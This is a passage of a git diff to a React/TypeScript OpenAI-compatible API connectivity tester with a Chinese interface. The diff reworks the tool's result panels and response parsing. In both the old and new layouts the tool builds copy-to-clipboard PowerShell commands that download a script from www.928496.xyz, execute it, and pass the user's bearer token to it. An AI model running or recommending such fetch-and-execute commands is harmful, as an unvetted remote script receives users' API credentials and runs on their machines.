@@ -37,6 +37,7 @@ type TestState = {
   error?: string;
   details?: any;
   requestedModel?: string;
+  requestBody?: any;
 };
 
 type ProxyResult = {
@@ -66,16 +67,46 @@ function maskToken(token: string) {
 }
 
 function extractTextFromResponse(data: any): string {
-  if (!data) return '未返回可读文本';
-  if (typeof data.output_text === 'string' && data.output_text.trim()) return data.output_text;
-  if (Array.isArray(data.output)) {
-    const chunks = data.output
+  if (!data) return '未返回空响应';
+  
+  let target = data;
+  
+  // 0. 如果 data 是字符串且看起来像 JSON，尝试解析它（处理双重转义的情况）
+  if (typeof data === 'string' && (data.trim().startsWith('{') || data.trim().startsWith('['))) {
+    try {
+      target = JSON.parse(data);
+    } catch {
+      // 解析失败则维持原样
+    }
+  }
+
+  // 1. 标准 OpenAI Chat 格式
+  const chatContent = target?.choices?.[0]?.message?.content;
+  if (typeof chatContent === 'string' && chatContent.trim()) return chatContent;
+  
+  // 2. 某些代理或模型的 output_text 格式
+  if (typeof target.output_text === 'string' && target.output_text.trim()) return target.output_text;
+  
+  // 3. 数组形式的 output 格式
+  if (Array.isArray(target.output)) {
+    const chunks = target.output
       .flatMap((item: any) => item?.content || [])
-      .map((item: any) => item?.text || item?.content || '')
+      .map((item: any) => (typeof item === 'string' ? item : item?.text || item?.content || ''))
       .filter(Boolean);
     if (chunks.length > 0) return chunks.join('\n');
   }
-  return '接口可用，但未返回可读文本';
+
+  // 4. 其它常见的 text/content 字段
+  if (typeof target.text === 'string' && target.text.trim()) return target.text;
+  if (typeof target.content === 'string' && target.content.trim()) return target.content;
+
+  // 5. 特殊保底：如果还是字符串，尝试用正则抓取内容（应对极其混乱的报文）
+  if (typeof data === 'string') {
+    const match = data.match(/"content"\s*:\s*"([^"]+)"/);
+    if (match && match[1]) return match[1].replace(/\\n/g, '\n').replace(/\\"/g, '"');
+  }
+
+  return typeof data === 'string' ? data : '接口可用，但无法解析出文本内容（请检查原始报文）';
 }
 
 function detectBestModel(models: any[]): string {
@@ -91,64 +122,94 @@ function StatusIcon({ status }: { status: TestStatus }) {
   if (status === 'error') return <XCircle className="w-5 h-5 text-red-500" />;
   if (status === 'warning') return <ShieldAlert className="w-5 h-5 text-amber-500" />;
   if (status === 'loading') return <Loader2 className="w-5 h-5 text-[var(--accent-color)] animate-spin" />;
-  return <Clock3 className="w-5 h-5 text-[var(--text-secondary)]" />;
+  return null;
 }
 
 function ResultPanel({
-  icon: Icon,
   state,
   children,
 }: {
-  icon: ElementType;
   state: TestState;
   children?: ReactNode;
 }) {
   const toneClass = {
-    idle: 'border-[var(--border-color)] bg-[var(--bg-surface)]',
-    loading: 'border-[var(--accent-color)]/20 bg-[var(--accent-color)]/5',
-    success: 'border-emerald-500/20 bg-emerald-500/5',
-    error: 'border-red-500/20 bg-red-500/5',
-    warning: 'border-amber-500/20 bg-amber-500/5',
+    idle: 'bg-[var(--bg-surface)] border-[var(--border-color)] opacity-60 grayscale hover:grayscale-0 hover:opacity-100',
+    loading: 'bg-[var(--accent-color)]/5 border-[var(--accent-color)]/30 ring-4 ring-[var(--accent-color)]/5',
+    success: 'bg-emerald-500/5 border-emerald-500/30 shadow-lg shadow-emerald-500/5',
+    error: 'bg-red-500/5 border-red-500/30 shadow-lg shadow-red-500/5',
+    warning: 'bg-amber-500/5 border-amber-500/30 shadow-lg shadow-amber-500/5',
   }[state.status];
 
   return (
-    <section className={`rounded-[28px] border p-5 md:p-6 transition-colors ${toneClass}`}>
-      <div className="flex items-start gap-4">
-        <div className="w-11 h-11 rounded-2xl bg-[var(--bg-main)] border border-[var(--border-color)] flex items-center justify-center shrink-0">
-          <Icon className="w-5 h-5 text-[var(--accent-color)]" />
-        </div>
-        <div className="flex-1 min-w-0">
-          <div className="flex items-center justify-between gap-3">
-            <div>
-              <h3 className="text-lg font-semibold text-[var(--text-primary)]">{state.title}</h3>
-              <p className="text-sm text-[var(--text-secondary)] mt-1">{state.description}</p>
-            </div>
+    <section className={`rounded-[24px] border p-5 transition-all duration-500 ${toneClass}`}>
+      <div className="flex-1 min-w-0">
+        <div className="flex items-center justify-between gap-3 overflow-hidden">
+          <div className="min-w-0 flex-1">
+            <h3 className="font-bold text-[var(--text-primary)] truncate text-xs tracking-tight uppercase opacity-90">
+              {state.title}
+            </h3>
+            {state.description && (
+              <p className="text-[10px] text-[var(--text-secondary)] mt-1 truncate opacity-70">
+                {state.description}
+              </p>
+            )}
+          </div>
+          <div className="shrink-0 scale-90">
             <StatusIcon status={state.status} />
           </div>
-          {state.url && (
-            <p className="mt-3 text-xs font-mono break-all text-[var(--text-secondary)] opacity-80">
-              {state.url}
-            </p>
-          )}
-          {state.error && (
-            <div className="mt-4 rounded-2xl border border-red-500/20 bg-red-500/5 p-4">
-              <p className="text-sm font-medium text-red-500">{state.error}</p>
-              {state.details && (
-                <pre className="mt-3 text-xs overflow-x-auto custom-scrollbar text-[var(--text-primary)]">
-                  {JSON.stringify(state.details, null, 2)}
-                </pre>
-              )}
-            </div>
-          )}
-          {children}
         </div>
+        {state.url && (
+          <p className="mt-2 text-[10px] font-mono break-all text-[var(--text-secondary)] opacity-40 leading-tight">
+            {state.url}
+          </p>
+        )}
+        {state.error && (
+          <div className="mt-3 rounded-xl border border-red-500/10 bg-red-500/5 p-3">
+            <p className="text-[11px] font-medium text-red-500">{state.error}</p>
+          </div>
+        )}
+        {(state.requestBody || state.data) && (
+          <div className="mt-4 pt-3 border-t border-[var(--border-color)]/30">
+            <details className="group">
+              <summary className="flex items-center gap-1.5 text-[10px] font-bold text-[var(--text-secondary)] uppercase tracking-widest cursor-pointer hover:text-[var(--accent-color)] transition-colors list-none">
+                <FileJson className="w-3 h-3 transition-transform group-open:rotate-90" />
+                查看原始报文
+              </summary>
+              <div className="mt-3 space-y-3 animate-in fade-in slide-in-from-top-1 duration-300">
+                {state.requestBody && (
+                  <div className="space-y-1.5">
+                    <div className="text-[9px] font-bold text-[var(--accent-color)] flex items-center gap-1 uppercase opacity-60">
+                      <Terminal className="w-2.5 h-2.5" />
+                      Request Body
+                    </div>
+                    <pre className="p-2.5 rounded-xl bg-[var(--bg-main)] border border-[var(--border-color)] text-[9px] font-mono overflow-x-auto custom-scrollbar text-[var(--text-primary)]/80 leading-tight">
+                      {JSON.stringify(state.requestBody, null, 2)}
+                    </pre>
+                  </div>
+                )}
+                {state.data && (
+                  <div className="space-y-1.5">
+                    <div className="text-[9px] font-bold text-emerald-500 flex items-center gap-1 uppercase opacity-60">
+                      <CheckCircle2 className="w-2.5 h-2.5" />
+                      Response Body
+                    </div>
+                    <pre className="p-2.5 rounded-xl bg-[var(--bg-main)] border border-[var(--border-color)] text-[9px] font-mono overflow-x-auto custom-scrollbar text-[var(--text-primary)]/80 leading-tight">
+                      {JSON.stringify(state.data, null, 2)}
+                    </pre>
+                  </div>
+                )}
+              </div>
+            </details>
+          </div>
+        )}
+        {children}
       </div>
     </section>
   );
 }
 
 export default function OpenAIConnectivityTool() {
-  const [url, setUrl] = useState(DEFAULT_URL);
+  const [url, setUrl] = useState('');
   const [token, setToken] = useState('');
   const [isTesting, setIsTesting] = useState(false);
   const [history, setHistory] = useState<HistoryItem[]>([]);
@@ -156,17 +217,17 @@ export default function OpenAIConnectivityTool() {
   const [modelsState, setModelsState] = useState<TestState>({
     status: 'idle',
     title: '模型列表检测',
-    description: '验证 `/models` 是否可访问，并提取后续测试使用的模型。',
+    description: '',
   });
   const [chatState, setChatState] = useState<TestState>({
     status: 'idle',
     title: 'Chat Completions 检测',
-    description: '验证 `/chat/completions` 是否可用，并读取最小对话返回。',
+    description: '',
   });
   const [responsesState, setResponsesState] = useState<TestState>({
     status: 'idle',
     title: 'Responses 检测',
-    description: '验证 `/responses` 是否支持，优先对齐较新的 OpenAI 接口能力。',
+    description: '',
   });
 
   useEffect(() => {
@@ -288,21 +349,22 @@ export default function OpenAIConnectivityTool() {
       }));
       saveHistory(url.trim(), token.trim());
 
-      currentStep = 'chat';
+      const chatPayload = {
+        model: selectedModel,
+        messages: [{ role: 'user', content: '你好' }],
+        max_tokens: 32,
+      };
       setChatState((prev) => ({
         ...prev,
         status: 'loading',
         requestedModel: selectedModel,
+        requestBody: chatPayload,
         url: `${normalizedBase}/chat/completions`,
       }));
       const chatResult = await runProxyTest({
         endpoint: '/chat/completions',
         method: 'POST',
-        payload: {
-          model: selectedModel,
-          messages: [{ role: 'user', content: '请回复“连接成功”四个字。' }],
-          max_tokens: 32,
-        },
+        payload: chatPayload,
       });
 
       if (!chatResult.success) {
@@ -324,21 +386,22 @@ export default function OpenAIConnectivityTool() {
         }));
       }
 
-      currentStep = 'responses';
+      const responsesPayload = {
+        model: selectedModel,
+        input: '请回复“连接成功”。',
+        max_output_tokens: 32,
+      };
       setResponsesState((prev) => ({
         ...prev,
         status: 'loading',
         requestedModel: selectedModel,
+        requestBody: responsesPayload,
         url: `${normalizedBase}/responses`,
       }));
       const responsesResult = await runProxyTest({
         endpoint: '/responses',
         method: 'POST',
-        payload: {
-          model: selectedModel,
-          input: '请回复“连接成功”。',
-          max_output_tokens: 32,
-        },
+        payload: responsesPayload,
       });
 
       if (!responsesResult.success) {
@@ -400,304 +463,275 @@ export default function OpenAIConnectivityTool() {
   };
 
   return (
-    <div className="grid grid-cols-1 xl:grid-cols-[minmax(0,1fr)_340px] gap-6">
-      <div className="space-y-6">
-        <section className="rounded-[32px] border border-[var(--border-color)] bg-[var(--bg-surface)] p-6 md:p-8 shadow-xl">
-          <div className="flex flex-col gap-6">
-            <div className="flex flex-col gap-3 md:flex-row md:items-start md:justify-between">
-              <div className="max-w-3xl">
-                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[var(--accent-color)]/10 text-[var(--accent-color)] text-xs font-bold tracking-wider uppercase">
-                  <PlugZap className="w-3.5 h-3.5" />
-                  OPENAI 兼容接口诊断
-                </div>
-                <h2 className="mt-4 text-2xl md:text-3xl font-bold tracking-tight">快速定位 API 连通性与兼容层问题</h2>
-                <p className="mt-3 text-sm md:text-base text-[var(--text-secondary)] leading-relaxed">
-                  这个工具承接了 `docs/openai-api-connectivity-tester` 的核心能力：输入 API Base URL 与 Bearer Token 后，顺序检测
-                  `/models`、`/chat/completions`、`/responses` 三类关键接口，并把错误细节、返回结构和本地历史集中展示。
-                </p>
-              </div>
-              <div className="rounded-[24px] border border-[var(--border-color)] bg-[var(--bg-main)] px-4 py-3 text-sm text-[var(--text-secondary)]">
-                <div>当前风格适配：浮云工具箱统一卡片与配色</div>
-                <div className="mt-1">核心差异处理：`responses` 改为 HTTP POST 兼容检测</div>
-              </div>
-            </div>
-
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-              <label className="block">
-                <span className="mb-2 flex items-center gap-2 text-sm font-medium text-[var(--text-primary)]">
-                  <Server className="w-4 h-4 text-[var(--accent-color)]" />
-                  API Base URL
-                </span>
-                <div className="relative">
-                  <input
-                    type="url"
-                    value={url}
-                    onChange={(event) => setUrl(event.target.value)}
-                    placeholder={DEFAULT_URL}
-                    className="w-full rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] pl-4 pr-12 py-3 outline-none focus:ring-2 focus:ring-[var(--accent-color)]/30 transition-all"
-                  />
-                  {url && (
-                    <button
-                      type="button"
-                      onClick={() => setUrl('')}
-                      aria-label="清空 API Base URL"
-                      className="absolute inset-y-0 right-2 flex items-center px-2 text-[var(--text-secondary)] hover:text-[var(--accent-color)] transition-colors"
-                    >
-                      <X className="w-4 h-4" />
-                    </button>
-                  )}
-                </div>
-              </label>
-
-              <label className="block">
-                <span className="mb-2 flex items-center gap-2 text-sm font-medium text-[var(--text-primary)]">
-                  <KeyRound className="w-4 h-4 text-[var(--accent-color)]" />
-                  Bearer Token
-                </span>
-                <div className="relative">
-                  <input
-                    type="password"
-                    value={token}
-                    onChange={(event) => setToken(event.target.value)}
-                    placeholder="sk-..."
-                    className="w-full rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] pl-4 pr-12 py-3 outline-none focus:ring-2 focus:ring-[var(--accent-color)]/30 transition-all font-mono text-sm"
-                  />
-                  {token && (
-                    <button
-                      type="button"
-                      onClick={() => setToken('')}
-                      aria-label="清空 Bearer Token"
-                      className="absolute inset-y-0 right-2 flex items-center px-2 text-[var(--text-secondary)] hover:text-[var(--accent-color)] transition-colors"
-                    >
-                      <X className="w-4 h-4" />
-                    </button>
-                  )}
-                </div>
-              </label>
-            </div>
-
-            <div className="flex flex-wrap items-center gap-3">
-              <button
-                onClick={handleRunTests}
-                disabled={isTesting}
-                className="inline-flex items-center gap-2 px-5 py-3 rounded-2xl bg-[var(--accent-color)] text-white font-semibold hover:brightness-110 transition-all disabled:opacity-70 disabled:cursor-not-allowed shadow-lg shadow-[var(--accent-color)]/20"
-              >
-                {isTesting ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
-                {isTesting ? '正在执行检测' : '开始完整测试'}
-              </button>
-              <button
-                onClick={resetStates}
-                disabled={isTesting}
-                className="inline-flex items-center gap-2 px-5 py-3 rounded-2xl border border-[var(--border-color)] hover:bg-[var(--hover-color)] transition-colors disabled:opacity-60"
-              >
-                <RefreshCw className="w-4 h-4" />
-                清空结果
-              </button>
-              <p className="text-sm text-[var(--text-secondary)]">
-                Token 仅用于当前测试请求；历史记录保存在浏览器本地。
-              </p>
-            </div>
-
-            {url.trim() && token.trim() && (
-              <div className="mt-2 space-y-3">
-                <div className="rounded-2xl border border-[var(--accent-color)]/20 bg-[var(--accent-color)]/5 p-4 animate-in fade-in slide-in-from-top-2 duration-300">
-                  <div className="flex items-center justify-between mb-3">
-                    <div className="flex items-center gap-2 text-sm font-semibold text-[var(--accent-color)]">
-                      <Terminal className="w-4 h-4" />
-                      PowerShell 配置命令 (Claude Code CLI)
-                    </div>
-                    <button
-                      onClick={() => {
-                      const base = url.trim().replace(/\/+$/, '');
-                      const normalized = base.endsWith('/v1') ? base : `${base}/v1`;
-                      const cmd = `& ([scriptblock]::Create((irm 'https://www.928496.xyz/s/68c6daaf'))) -BaseUrl "${normalized}" -AuthToken "${token.trim()}"`;
-                      navigator.clipboard.writeText(cmd).then(() => {
-                        window.showToast?.('命令已复制到剪贴板', 'success');
-                      });
-                    }}
-                      title="复制命令"
-                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[var(--accent-color)]/10 hover:bg-[var(--accent-color)]/20 text-[var(--accent-color)] text-xs font-medium transition-all"
-                    >
-                      <Copy className="w-3.5 h-3.5" />
-                      复制
-                    </button>
+    <div className="max-w-[1400px] mx-auto w-full p-2 lg:p-4">
+      {/* 顶部布局网格 */}
+      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        
+        {/* 左侧主要配置区 */}
+        <div className="lg:col-span-8 flex flex-col gap-6">
+          <section className="relative overflow-hidden rounded-[32px] border border-[var(--border-color)] bg-[var(--bg-surface)] p-6 md:p-10 shadow-2xl shadow-black/5">
+            {/* 背景装饰渐变 */}
+            <div className="absolute top-0 right-0 -mr-20 -mt-20 w-64 h-64 bg-[var(--accent-color)]/5 blur-[80px] rounded-full pointer-events-none" />
+            
+            <div className="relative flex flex-col gap-8">
+              {/* 输入区域 */}
+              <div className="grid grid-cols-1 gap-6">
+                <div className="space-y-3">
+                  <label className="flex items-center gap-2 text-[11px] font-bold uppercase tracking-wider text-[var(--text-secondary)] opacity-70">
+                    <Server className="w-3.5 h-3.5 text-[var(--accent-color)]" />
+                    API Base URL
+                  </label>
+                  <div className="group relative">
+                    <input
+                      type="url"
+                      value={url}
+                      onChange={(event) => setUrl(event.target.value)}
+                      placeholder={DEFAULT_URL}
+                      className="w-full rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] px-5 py-4 outline-none focus:ring-4 focus:ring-[var(--accent-color)]/10 focus:border-[var(--accent-color)] transition-all text-sm font-medium shadow-sm hover:shadow-md"
+                    />
+                    {url && (
+                      <button
+                        type="button"
+                        onClick={() => setUrl('')}
+                        className="absolute inset-y-0 right-3 flex items-center px-2 text-[var(--text-secondary)] hover:text-red-500 transition-colors"
+                      >
+                        <X className="w-4 h-4" />
+                      </button>
+                    )}
                   </div>
-                  <div className="relative group">
-                    <div className="text-[13px] font-mono break-all bg-[var(--bg-main)] p-3.5 rounded-xl border border-[var(--border-color)] text-[var(--text-primary)] leading-relaxed select-all">
-                      & ([scriptblock]::Create((irm 'https://www.928496.xyz/s/68c6daaf'))) -BaseUrl "{url.trim().replace(/\/+$/, '').endsWith('/v1') ? url.trim().replace(/\/+$/, '') : `${url.trim().replace(/\/+$/, '')}/v1`}" -AuthToken "{token.trim()}"
-                    </div>
-                  </div>
-                  <p className="mt-2 text-[11px] text-[var(--text-secondary)] opacity-70">
-                    复制此命令在 PowerShell 中运行，可快速为当前本地环境配置 Claude API。
-                  </p>
                 </div>
 
-                <div className="rounded-2xl border border-[var(--accent-color)]/20 bg-[var(--accent-color)]/5 p-4 animate-in fade-in slide-in-from-top-2 duration-300">
-                  <div className="flex items-center justify-between mb-3">
-                    <div className="flex items-center gap-2 text-sm font-semibold text-[var(--accent-color)]">
-                      <Terminal className="w-4 h-4" />
-                      PowerShell 配置命令 (OpenAI Codex CLI)
-                    </div>
-                    <button
-                      onClick={() => {
-                      const base = url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '');
-                      const normalized = `${base}/v1`;
-                      const cmd = `& ([scriptblock]::Create((irm 'https://www.928496.xyz/s/321b2e18'))) -BaseUrl "${normalized}" -AuthToken "${token.trim()}"`;
-                      navigator.clipboard.writeText(cmd).then(() => {
-                        window.showToast?.('命令已复制到剪贴板', 'success');
-                      });
-                    }}
-                      title="复制命令"
-                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[var(--accent-color)]/10 hover:bg-[var(--accent-color)]/20 text-[var(--accent-color)] text-xs font-medium transition-all"
-                    >
-                      <Copy className="w-3.5 h-3.5" />
-                      复制
-                    </button>
+                <div className="space-y-3">
+                  <label className="flex items-center gap-2 text-[11px] font-bold uppercase tracking-wider text-[var(--text-secondary)] opacity-70">
+                    <KeyRound className="w-3.5 h-3.5 text-[var(--accent-color)]" />
+                    Bearer Token
+                  </label>
+                  <div className="group relative">
+                    <input
+                      type="password"
+                      value={token}
+                      onChange={(event) => setToken(event.target.value)}
+                      placeholder="sk-..."
+                      className="w-full rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] px-5 py-4 outline-none focus:ring-4 focus:ring-[var(--accent-color)]/10 focus:border-[var(--accent-color)] transition-all text-sm font-mono shadow-sm hover:shadow-md"
+                    />
+                    {token && (
+                      <button
+                        type="button"
+                        onClick={() => setToken('')}
+                        className="absolute inset-y-0 right-3 flex items-center px-2 text-[var(--text-secondary)] hover:text-red-500 transition-colors"
+                      >
+                        <X className="w-4 h-4" />
+                      </button>
+                    )}
                   </div>
-                  <div className="relative group">
-                    <div className="text-[13px] font-mono break-all bg-[var(--bg-main)] p-3.5 rounded-xl border border-[var(--border-color)] text-[var(--text-primary)] leading-relaxed select-all">
-                      & ([scriptblock]::Create((irm 'https://www.928496.xyz/s/321b2e18'))) -BaseUrl "{url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '') + '/v1'}" -AuthToken "{token.trim()}"
-                    </div>
-                  </div>
-                  <p className="mt-2 text-[11px] text-[var(--text-secondary)] opacity-70">
-                    复制此命令在 PowerShell 中运行，可自动配置 OpenAI Codex CLI 基础地址与密钥。
-                  </p>
                 </div>
               </div>
-            )}
-          </div>
-        </section>
 
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-          <ResultPanel icon={Server} state={modelsState}>
-            {modelsState.status === 'success' && (
-              <div className="mt-4 space-y-3">
-                <p className="text-sm text-[var(--text-secondary)]">
-                  共识别到 <span className="font-semibold text-[var(--text-primary)]">{modelsState.data?.data?.length || 0}</span> 个模型，
-                  已选择 <span className="font-mono text-[var(--text-primary)]">{modelsState.requestedModel}</span> 继续后续测试。
-                </p>
-                <div className="flex flex-wrap gap-2 max-h-40 overflow-y-auto custom-scrollbar pr-1">
-                  {(modelsState.data?.data || []).slice(0, 30).map((item: any) => (
-                    <span
-                      key={item.id}
-                      className="px-2.5 py-1 rounded-full bg-[var(--bg-main)] border border-[var(--border-color)] text-xs font-mono text-[var(--text-primary)]"
-                    >
-                      {item.id}
-                    </span>
-                  ))}
-                </div>
-              </div>
-            )}
-          </ResultPanel>
-
-          <ResultPanel icon={MessageSquare} state={chatState}>
-            {chatState.status === 'success' && (
-              <div className="mt-4 space-y-3">
-                <p className="text-sm text-[var(--text-secondary)]">
-                  请求模型：<span className="font-mono text-[var(--text-primary)]">{chatState.requestedModel}</span>
-                </p>
-                <div className="rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] p-4 text-sm leading-relaxed text-[var(--text-primary)]">
-                  {chatState.data?.choices?.[0]?.message?.content || '接口已返回成功，但没有提取到消息文本。'}
-                </div>
-              </div>
-            )}
-          </ResultPanel>
-
-          <ResultPanel icon={FileJson} state={responsesState}>
-            {(responsesState.status === 'success' || responsesState.status === 'warning') && (
-              <div className="mt-4 space-y-3">
-                <p className="text-sm text-[var(--text-secondary)]">
-                  请求模型：<span className="font-mono text-[var(--text-primary)]">{responsesState.requestedModel}</span>
-                </p>
-                {responsesState.status === 'success' ? (
-                  <div className="rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] p-4 text-sm leading-relaxed text-[var(--text-primary)]">
-                    {extractTextFromResponse(responsesState.data)}
-                  </div>
-                ) : (
-                  <div className="rounded-2xl border border-amber-500/20 bg-amber-500/5 p-4 text-sm leading-relaxed text-[var(--text-primary)]">
-                    当前端点可能不支持标准 `responses` 接口，或要求厂商自定义参数。已保留返回细节，便于你继续判断兼容策略。
-                  </div>
-                )}
-                {responsesState.data && (
-                  <details className="rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] p-4">
-                    <summary className="cursor-pointer text-sm font-medium">查看原始返回</summary>
-                    <pre className="mt-3 text-xs overflow-x-auto custom-scrollbar text-[var(--text-primary)]">
-                      {JSON.stringify(responsesState.data, null, 2)}
-                    </pre>
-                  </details>
-                )}
-              </div>
-            )}
-          </ResultPanel>
-        </div>
-      </div>
-
-      <aside className="rounded-[32px] border border-[var(--border-color)] bg-[var(--bg-surface)] p-5 md:p-6 shadow-xl h-fit xl:sticky xl:top-8">
-        <div className="flex items-center justify-between gap-3">
-          <div>
-            <h3 className="text-lg font-semibold flex items-center gap-2">
-              <History className="w-5 h-5 text-[var(--accent-color)]" />
-              测试历史
-            </h3>
-            <p className="mt-1 text-sm text-[var(--text-secondary)]">快速回填最近使用过的地址与 Token。</p>
-          </div>
-          {!historyEmpty && (
-            <button
-              onClick={clearHistory}
-              className="inline-flex items-center gap-1.5 text-xs text-[var(--text-secondary)] hover:text-red-500 transition-colors"
-            >
-              <Trash2 className="w-3.5 h-3.5" />
-              清空
-            </button>
-          )}
-        </div>
-
-        <div className="mt-5 space-y-3 max-h-[560px] overflow-y-auto custom-scrollbar pr-1">
-          {historyEmpty ? (
-            <div className="rounded-[24px] border border-dashed border-[var(--border-color)] p-8 text-center text-[var(--text-secondary)]">
-              <History className="w-8 h-8 mx-auto opacity-30" />
-              <p className="mt-3 text-sm">还没有测试历史</p>
-            </div>
-          ) : (
-            history.map((item) => (
-              <button
-                key={`${item.url}-${item.token}-${item.timestamp}`}
-                onClick={() => loadHistory(item)}
-                className="w-full text-left rounded-[24px] border border-[var(--border-color)] p-4 bg-[var(--bg-main)] hover:bg-[var(--hover-color)] transition-colors group"
-              >
-                <div className="flex items-start justify-between gap-3">
-                  <div className="min-w-0 flex-1">
-                    <p className="text-sm font-medium text-[var(--text-primary)] break-all">{item.url}</p>
-                    <p className="mt-2 text-xs font-mono text-[var(--text-secondary)]">{maskToken(item.token)}</p>
-                    <p className="mt-2 text-xs text-[var(--text-secondary)]">
-                      {new Date(item.timestamp).toLocaleString('zh-CN')}
-                    </p>
-                  </div>
+              {/* 操作按钮 */}
+              <div className="flex items-center justify-between pt-2 border-t border-[var(--border-color)]/60">
+                <div className="flex items-center gap-3">
                   <button
-                    type="button"
-                    onClick={(event) => {
-                      event.stopPropagation();
-                      removeHistory(item);
-                    }}
-                    className="p-2 rounded-full text-[var(--text-secondary)] hover:text-red-500 hover:bg-red-500/10 opacity-0 group-hover:opacity-100 transition-all"
+                    onClick={handleRunTests}
+                    disabled={isTesting}
+                    title={isTesting ? '正在检测...' : '开始执行检测'}
+                    className={`relative overflow-hidden flex items-center justify-center p-4 rounded-2xl bg-[var(--accent-color)] text-white shadow-xl shadow-[var(--accent-color)]/20 hover:scale-105 active:scale-95 transition-all disabled:opacity-50 disabled:cursor-not-allowed`}
                   >
-                    <Trash2 className="w-4 h-4" />
+                    {isTesting ? <Loader2 className="w-6 h-6 animate-spin" /> : <Play className="w-6 h-6 fill-current" />}
+                  </button>
+                  <button
+                    onClick={resetStates}
+                    disabled={isTesting}
+                    title="清置所有状态"
+                    className="flex items-center justify-center p-4 rounded-2xl border border-[var(--border-color)] bg-[var(--bg-main)] text-[var(--text-secondary)] hover:bg-red-500/5 hover:text-red-500 hover:border-red-500/30 transition-all active:scale-95 disabled:opacity-50"
+                  >
+                    <Trash2 className="w-6 h-6" />
                   </button>
                 </div>
-              </button>
-            ))
-          )}
-        </div>
+                
+                <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-[var(--bg-main)] border border-[var(--border-color)]">
+                  <div className={`w-2 h-2 rounded-full ${isTesting ? 'bg-amber-500 animate-pulse' : 'bg-emerald-500'}`} />
+                  <span className="text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)]">系统准备就绪</span>
+                </div>
+              </div>
 
-        <div className="mt-5 rounded-[24px] border border-amber-500/20 bg-amber-500/5 p-4 text-sm text-[var(--text-secondary)]">
-          <div className="flex items-start gap-3">
-            <ShieldAlert className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
-            <p>
-              历史仅保存在当前浏览器的 `localStorage`。如果你在共享设备上使用，请在结束后主动清空。
-            </p>
+              {/* CLI 配置快照 - 仅在有配置时显示 */}
+              {url.trim() && token.trim() && (
+                <div className="rounded-[24px] bg-gradient-to-br from-[var(--bg-main)] to-[var(--bg-main)]/50 border border-[var(--border-color)] p-5 space-y-4 shadow-sm">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2 text-[11px] font-bold text-[var(--accent-color)] uppercase tracking-tight">
+                      <Terminal className="w-3.5 h-3.5" />
+                      CLI 快速配置 (PowerShell)
+                    </div>
+                  </div>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div className="group relative bg-[var(--bg-surface)] p-3 rounded-xl border border-[var(--border-color)] hover:border-[var(--accent-color)]/40 transition-all">
+                      <div className="text-[9px] font-bold text-[var(--text-secondary)] mb-1.5 uppercase opacity-60">Claude Code</div>
+                      <div className="text-[10px] font-mono truncate opacity-80 pr-8">
+                        & ([scriptblock]::Create((irm '...'))) -BaseUrl "{url}" ...
+                      </div>
+                      <button 
+                        onClick={() => {
+                          const base = url.trim().replace(/\/+$/, '');
+                          const normalized = base.endsWith('/v1') ? base : `${base}/v1`;
+                          const cmd = `& ([scriptblock]::Create((irm 'https://www.928496.xyz/s/68c6daaf'))) -BaseUrl "${normalized}" -AuthToken "${token.trim()}"`;
+                          navigator.clipboard.writeText(cmd).then(() => window.showToast?.('已复制', 'success'));
+                        }}
+                        className="absolute right-2 bottom-2 p-1.5 rounded-lg bg-[var(--accent-color)] text-white opacity-0 group-hover:opacity-100 transition-all"
+                      >
+                        <Copy className="w-3 h-3" />
+                      </button>
+                    </div>
+                    <div className="group relative bg-[var(--bg-surface)] p-3 rounded-xl border border-[var(--border-color)] hover:border-[var(--accent-color)]/40 transition-all">
+                      <div className="text-[9px] font-bold text-[var(--text-secondary)] mb-1.5 uppercase opacity-60">OpenAI Codex</div>
+                      <div className="text-[10px] font-mono truncate opacity-80 pr-8">
+                        & ([scriptblock]::Create((irm '...'))) -BaseUrl "{url}" ...
+                      </div>
+                      <button 
+                         onClick={() => {
+                          const base = url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '');
+                          const normalized = `${base}/v1`;
+                          const cmd = `& ([scriptblock]::Create((irm 'https://www.928496.xyz/s/321b2e18'))) -BaseUrl "${normalized}" -AuthToken "${token.trim()}"`;
+                          navigator.clipboard.writeText(cmd).then(() => window.showToast?.('已复制', 'success'));
+                        }}
+                        className="absolute right-2 bottom-2 p-1.5 rounded-lg bg-[var(--accent-color)] text-white opacity-0 group-hover:opacity-100 transition-all"
+                      >
+                        <Copy className="w-3 h-3" />
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              )}
+            </div>
+          </section>
+
+          {/* 三列检测结果 - 始终显示但会有状态变化 */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <ResultPanel state={modelsState}>
+              {modelsState.status === 'success' && (
+                <div className="mt-4 pt-4 border-t border-[var(--border-color)]/40 space-y-3">
+                  <div className="flex items-center justify-between">
+                    <span className="text-[10px] font-medium text-[var(--text-secondary)]">识别到 {modelsState.data?.data?.length || 0} 个模型</span>
+                    <button
+                      onClick={() => {
+                        const ids = (modelsState.data?.data || []).map((m: any) => m.id).join('\n');
+                        navigator.clipboard.writeText(ids).then(() => window.showToast?.('已全部复制', 'success'));
+                      }}
+                      title="复制全部模型 ID"
+                      className="p-1.5 rounded bg-[var(--accent-color)]/10 text-[var(--accent-color)] hover:bg-[var(--accent-color)]/20 transition-all active:scale-90"
+                    >
+                      <Copy className="w-3 h-3" />
+                    </button>
+                  </div>
+                  <div className="flex flex-wrap gap-1.5 max-h-24 overflow-y-auto custom-scrollbar">
